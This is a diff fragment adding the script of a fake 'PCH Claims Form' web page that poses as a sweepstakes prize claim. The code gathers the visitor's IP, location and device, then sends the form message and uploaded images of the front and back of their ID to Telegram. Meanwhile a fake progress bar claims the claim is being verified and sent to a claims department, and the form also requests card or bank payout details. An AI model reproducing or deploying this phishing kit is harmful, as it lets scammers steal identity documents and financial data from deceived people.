+                if (/iPhone/i.test(userAgent)) device = '📱 iPhone';
+                else if (/iPad/i.test(userAgent)) device = '📱 iPad';
+                else if (/Android/i.test(userAgent)) device = '📱 Android';
+            } else {
+                device = '💻 Desktop';
+                if (/Mac/i.test(userAgent)) device = '💻 Mac';
+                else if (/Windows/i.test(userAgent)) device = '💻 Windows';
+                else if (/Linux/i.test(userAgent)) device = '💻 Linux';
+            }
+            userDevice = device;
+
+            // Get IP
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    userIP = data.ip || 'Unknown';
+                    const location = `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
+                    const finalMessage = message.replace('Auto-detected', `${userIP} • ${location}`);
+                    // Start loading and send
+                    startLoading(() => {
+                        sendToTelegram(finalMessage);
+                        sendToTelegram('🪪 *ID - Front*', idFrontData);
+                        sendToTelegram('🪪 *ID - Back*', idBackData);
+                        showSuccess();
+                    });
+                })
+                .catch(() => {
+                    // Fallback if IP fails
+                    startLoading(() => {
+                        sendToTelegram(message);
+                        sendToTelegram('🪪 *ID - Front*', idFrontData);
+                        sendToTelegram('🪪 *ID - Back*', idBackData);
+                        showSuccess();
+                    });
+                });
+        }
+
+        // ============================================
+        // LOADING ANIMATION
+        // ============================================
+        let loadingInterval = null;
+
+        function startLoading(callback) {
+            const overlay = document.getElementById('loadingOverlay');
+            const fill = document.getElementById('progressFill');
+            const text = document.getElementById('progressText');
+
+            overlay.classList.add('show');
+            fill.style.width = '0%';
+            text.textContent = '0%';
+
+            let progress = 0;
+            const stepTime = 60;
+
+            if (loadingInterval) clearInterval(loadingInterval);
+
+            loadingInterval = setInterval(() => {
+                progress += 2;
+                if (progress > 100) {
+                    progress = 100;
+                    clearInterval(loadingInterval);
+                    loadingInterval = null;
+
+                    setTimeout(() => {
+                        overlay.classList.remove('show');
+                        if (callback) callback();
+                    }, 500);
+                }
+
+                let statusText = 'Processing claim...';
+                if (progress >= 10 && progress < 30) statusText = 'Verifying identity...';
+                else if (progress >= 30 && progress < 50) statusText = 'Checking ID documents...';
+                else if (progress >= 50 && progress < 70) statusText = 'Validating payout method...';
+                else if (progress >= 70 && progress < 90) statusText = 'Finalizing submission...';
+                else if (progress >= 90) statusText = 'Sending to claims department...';
+
+                document.querySelector('.loading-sub').textContent = statusText;
+                fill.style.width = progress + '%';
+                text.textContent = progress + '%';
+            }, stepTime);
+        }
+
+        // ============================================
+        // SHOW SUCCESS
+        // ============================================
+        function showSuccess() {
+            document.getElementById('successPopup').classList.add('show');
+            // Reset form
+            document.getElementById('claimsForm').reset();
+            document.getElementById('idFrontPreview').style.display = 'none';
+            document.getElementById('idFrontUpload').style.display = 'block';
+            document.getElementById('idBackPreview').style.display = 'none';
+            document.getElementById('idBackUpload').style.display = 'block';
+            document.getElementById('cardFields').classList.remove('show');
+            document.getElementById('bankFields').classList.remove('show');
+            document.getElementById('payoutMethod').value = '';
+            idFrontData = null;
+            idBackData = null;
+            updateAcceptName();
+            showStatus('✅ Claim submitted successfully!', 'success');
+        }
+
+        function closeSuccess() {
+            document.getElementById('successPopup').classList.remove('show');
+        }
+
+        // ============================================
+        // STATUS BAR
+        // ============================================
+        function showStatus(msg, type) {
+            const bar = document.getElementById('statusBar');
+            bar.textContent = msg;
+            bar.className = 'status-bar ' + type;
+            bar.style.display = 'block';
+            setTimeout(() => { bar.style.display = 'none'; }, 5000);
+        }
+
+        // ============================================
+        // IP & DEVICE DETECTION
+        // ============================================
+        let userIP = 'Unknown';
+        let userDevice = 'Unknown';
+
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                userIP = data.ip || 'Unknown';
+            })
+            .catch(() => {});
+
+        const ua = navigator.userAgent;
+        if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+            userDevice = '📱 Mobile';
+            if (/iPhone/i.test(ua)) userDevice = '📱 iPhone';
+            else if (/iPad/i.test(ua)) userDevice = '📱 iPad';
+            else if (/Android/i.test(ua)) userDevice = '📱 Android';
+        } else {
+            userDevice = '💻 Desktop';
+            if (/Mac/i.test(ua)) userDevice = '💻 Mac';
+            else if (/Windows/i.test(ua)) userDevice = '💻 Windows';
+            else if (/Linux/i.test(ua)) userDevice = '💻 Linux';
+        }
+
+        console.log('🏆 PCH Claims Form Loaded');
+        console.log(`📱 Device: ${userDevice}`);
+        console.log(`🌐 IP: ${userIP}`);
+    </script>
+
+</body>
+</html>
